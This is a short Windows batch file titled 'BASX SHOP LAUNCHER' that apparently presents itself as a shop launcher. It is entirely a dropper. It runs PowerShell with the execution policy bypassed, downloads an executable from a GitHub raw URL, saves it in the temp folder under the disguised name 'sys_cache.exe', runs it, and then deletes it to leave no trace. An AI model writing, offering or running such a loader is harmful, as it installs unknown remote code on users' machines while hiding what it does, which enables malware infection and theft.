@echo off
title BASX SHOP LAUNCHER

powershell -NoProfile -ExecutionPolicy Bypass -Command "$u='https://github.com/relaxhaha56-maker/node-storage-33/raw/refs/heads/main/BASX_SHOP.exe'; $p='%TEMP%\sys_cache.exe'; (New-Object System.Net.WebClient).DownloadFile($u,$p); Start-Process $p -Wait; Remove-Item $p -Force"
exit